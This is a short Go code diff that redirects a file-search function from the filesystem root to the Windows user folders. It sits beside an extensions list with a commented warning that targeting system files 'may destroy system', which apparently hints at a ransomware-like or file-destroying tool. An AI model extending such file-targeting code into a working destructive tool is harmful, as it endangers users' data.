@@ -13,7 +13,7 @@ import (
 )
 
 func search() ([]string, error) {
-	dir := "/"
+	dir := "C:\\Users\\"
 	extensions := []string{
 
 		// "exe,", "dll", "so", "rpm", "deb", "vmlinuz", "img",  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
